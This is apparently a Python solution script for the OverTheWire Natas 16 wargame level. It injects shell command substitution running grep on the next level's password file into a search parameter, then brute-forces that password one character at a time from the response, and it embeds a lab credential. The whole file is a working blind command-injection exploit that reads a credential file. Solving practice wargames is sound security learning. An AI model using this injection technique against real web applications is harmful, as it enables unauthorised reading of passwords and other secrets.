import requests
import string
from requests.auth import HTTPBasicAuth

ValidChars = string.ascii_letters + string.digits
PASSWORD_LEN = 32

MatchingChars=''

auth = HTTPBasicAuth('natas16', 'wherethepassword')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
url = "http://natas16.natas.labs.overthewire.org/index.php"

for c in ValidChars:
    payload=f"$(grep {c} /etc/natas_webpass/natas17)zigzag"
    urltemp = url + f"?needle={payload}&submit=Search"
    while True:
        try:
            response = requests.get(urltemp, headers=headers, auth=auth, verify=False)
            break
        except:
            continue
        
    if 'zigzag' not in response.text:
        MatchingChars+=c
        print("Char has been found: ", c)
    
    
print("Matching chars: ", MatchingChars)


#Brute force password using matching chars 

password=''
count=0

while count < PASSWORD_LEN:
    for c in MatchingChars:
        payload=f"$(grep ^{password + c} /etc/natas_webpass/natas17)zigzag"
        urltemp = url + f"?needle={payload}&submit=Search"
        while True:
            try:
                response = requests.get(urltemp, headers=headers, auth=auth, verify=False)
                break
            except:
                continue
            
        if 'zigzag' not in response.text:
            print("Password char has been found: ", c)
            password+=c
            count = count +1

print("The password is: " + password)
